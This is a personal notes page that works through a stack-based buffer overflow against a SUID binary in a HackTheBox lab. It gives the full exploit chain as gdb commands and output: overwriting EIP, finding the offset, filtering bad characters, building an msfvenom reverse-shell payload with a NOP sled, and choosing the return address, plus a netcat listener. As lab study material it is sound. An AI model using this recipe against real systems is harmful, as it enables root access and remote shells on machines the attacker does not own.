---
title: "Overflows"
date: 2023-01-03
modified: 2023-01-04
draft: false
summary: "Provide user input which causes an overflow (segfault)."
---

{{< hacking-disclaimer >}}

## What's happening?

- The goal is to provide user input which causes an overflow (segfault).
- We put our own value into the overflow - shellcode.
- We want the processor to then jump back to execute our code, which we do by controlling the memory address in the `EIP` register. Setting this to the right values causes the processor to jump to the shellcode and execute it.
- We can use `msfvenom` to generate shellcode which allows us to get a reverse shell.
  - This is particularly useful if the binary has `suid` and we can execute as root.
  - Even if not, getting user access is useful.

### Example

For example, in in the [HTB Skills Assessment](https://academy.hackthebox.com/module/31/section/599):

> On this machine, we have a standard user "htb-student" who can leave a message to the administrator using a self-written program called "leave_msg." After our research, we found out that these messages are stored in "/htb-student/msg.txt," which is binary owned by the user root, and the SUID bit is set. Examine the program and find out if it is vulnerable to a Stack-Based Buffer Overflow. If you have found the vulnerability, then use it to read the file "/root/flag.txt" placed on the system as proof.

By pushing a value through the input, we can use the `suid` capabilities to read the root flag.

### GDB Setup

```shell
echo 'set disassembly-flavor intel' > ~/.gdbinit
```

## Step 1 - Trigger an overflow

Can we trigger an overflow? We can send an arbitrary sized payload using gdb to see if it segfaults.

```shell
gdb -q bow32
(gdb) run $(python -c "print('\x55' * 1200)")
```

This sends 1200 `\x55` characters. Vary the number to see at which point it will segfault and overwrite the `EIP` register, which can be checked with the output from `info registers`:

```shell
(gdb) info registers

eax            0x1 1
ecx            0xffffd6c0 -10560
edx            0xffffd06f -12177
ebx            0x55555555 1431655765
esp            0xffffcfd0 0xffffcfd0
ebp            0x55555555 0x55555555  # <---- EBP overwritten
esi            0xf7fb5000 -134524928
edi            0x0 0
eip            0x55555555 0x55555555  # <---- EIP overwritten
eflags         0x10286 [ PF SF IF RF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0 0
gs             0x63 99
```

## Step 2 - Determine offset

Once we have the `EIP` overwritten, we need to generate a payload that can determine the offset. With the known size above, we can use msf to do this:

`msf-pattern_create -l 1200`

Run the output in gdb then get the memory address:

```shell
(gdb) run $(python -c "print('pattern')")
(gdb) info registers eip

eip            0x69423569 0x69423569
```

This memory address can then be used to find the exact offset:

`msf-pattern_offset -q 0x69423569`

This will output a value to use e.g. `1036`

## Step 3 - Overwrite EIP

We can now check that we're overwriting the `EIP`

```shell
(gdb) run $(python -c "print('\x55' * 1036 + '\x66' * 4)")
```

This will put x4 `\x66` into the `EIP`, which we can check:

```shell
(gdb) info registers
...
 ebx            0x55555555       1431655765
...
 ebp            0x55555555       0x55555555  # <---- EBP overwritten
...
 eip            0x66666666       0x66666666  # <---- EIP overwritten
...
```

## Step 4 - Check bad chars

We need to remove any bad characters which might stop execution. From this full list of 256:

```shell
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

We will need to set a breakpoint so we can investigate the memory without the program crashing:

```shell
(gdb) disas main
Dump of assembler code for function main:
    0x0000073b <+0>:     lea    0x4(%esp),%ecx
    0x0000073f <+4>:     and    $0xfffffff0,%esp
    ...
    0x00000777 <+60>:    push   %eax
    0x00000778 <+61>:    call   0x68d <leavemsg>
    0x0000077d <+66>:    add    $0x10,%esp
 ...
    0x0000079e <+99>:    lea    -0x4(%ecx),%esp
    0x000007a1 <+102>:   ret
(gdb) break leavemsg
```

We set the breakpoint to `leavemsg` and then try and crash it:

```shell
(gdb) run $(python -c 'print("\x55" * (1036 - 256 - 4) + "chars" + "\x66" * 4)')
```

`1036` = the offset
`256` = the length of the chars
`4` = the final repeat of `\x66`

Then we can examine the memory output using `x/2000xb $esp+750` and see what is missing after `\x55`. For each one, remove it from the chars and decrement the 256 by 1. Make a note of the chars for the payload.

## Step 5 - Generate payload

Generate the reverse shell payload and get the size:

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> lport=4444 --platform linux --format c --bad-chars="\x00\x09\x0a\x20"
...
Payload size: 74 bytes
...
```

We can then run the payload:

```shell
(gdb) run $(python -c 'print("\x55" * (1036 - 100 - 74 - 4) + "\x90" * 100 + "payload" + "\x66" * 4)')
```

## Step 6 - Identify return address

This will hit the breakpoint again and we can run through the memory output from `x/2000xb $esp+750` to find a point before the payload starts. The 100 `NOP`s (`\x90`) provide a buffer, so picking the last line they appear on is a good idea.

```shell
(gdb) x/2000xb $esp+750
...
0xffffd692: 0x55 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd69a: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6a2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6aa: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6b2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6ba: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6c2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6ca: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6d2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6da: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6e2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6ea: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6f2: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd6fa: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd702: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
0xffffd70a: 0x90 0x90 0x90 0x90 0x90 0xbf 0x2a 0x40
0xffffd712: 0xef 0xee 0xdb 0xdc 0xd9 0x74 0x24 0xf4
0xffffd71a: 0x58 0x31 0xc9 0xb1 0x12 0x31 0x78 0x12
0xffffd722: 0x83 0xe8 0xfc 0x03 0x52 0x4e 0x0d 0x1b
```

In this example we could pick `0xffffd6fa`.

## Step 7 - Run the exploit

We adjust our final line to swap out the final x4 `\x66` with the above memory address in little endian i.e. reversed:

```shell
(gdb) run $(python -c 'print("\x55" * (1036 - 100 - 74 - 4) + "\x90" * 100 + "payload" + "\xfa\xd6\xff\xff")')
```

This will execute the shellcode. As we set up a remote TCP payload, don't forget to `nc -lvnp 4444`

**Note**
If we expect to become root, we need to run this outside of gdb:

```shell
./leave_msg $(python -c 'print("\x55" * (1036 - 100 - 74 - 4) + "\x90" * 100 + "payload" + "\xfa\xd6\xff\xff")')
```
